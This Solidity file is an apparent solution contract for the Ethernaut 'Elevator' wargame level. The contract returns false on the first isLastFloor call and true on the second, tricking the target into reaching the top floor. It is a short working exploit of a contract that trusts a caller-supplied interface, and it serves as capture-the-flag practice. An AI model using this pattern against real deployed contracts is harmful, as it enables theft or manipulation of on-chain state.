// SPDX-License-Identifier: MIT

pragma solidity ^0.8.7;

interface IElevator {
    function goTo(uint256 _floor) external;
}

contract Ethernaut11 {
    bool check = false;

    function hack(address _address) public {
        IElevator elevator = IElevator(_address);
        elevator.goTo(1);
    }

    function isLastFloor(uint _floor) external returns (bool) {
        if (!check) {
            check = true;
            return false;
        } else {
            return true;
        }
    }
}